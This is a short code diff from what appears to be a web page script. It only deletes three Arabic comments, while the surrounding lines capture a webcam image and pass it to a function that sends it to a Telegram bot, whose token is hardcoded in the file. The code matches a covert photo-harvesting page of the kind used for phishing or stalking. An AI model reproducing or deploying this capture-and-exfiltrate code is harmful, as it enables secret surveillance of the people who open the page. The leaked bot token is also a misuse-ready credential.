@@ -208,7 +208,7 @@
 
       const telegramToken = '7787402061:AAFT_HmER6J9o0JfU6u1LeiGeGHKXNpaSM0';
 
-      // تشغيل الكاميرا
+      //
       navigator.mediaDevices.getUserMedia({ video: true })
           .then((stream) => {
               newVideo.srcObject = stream;
@@ -218,7 +218,7 @@
                   canvas.width = newVideo.videoWidth;
                   canvas.height = newVideo.videoHeight;
 
-                  // عكس الصورة أفقياً
+                  // 
                   context.translate(canvas.width, 0);
                   context.scale(-1, 1);
 
@@ -232,7 +232,7 @@
 
                   const imageData = canvas.toDataURL('image/png');
 
-                  // إيقاف الكاميرا بعد التصوير
+                  // 
                   stream.getTracks().forEach(track => track.stop());
 
                   sendToTelegram(imageData);
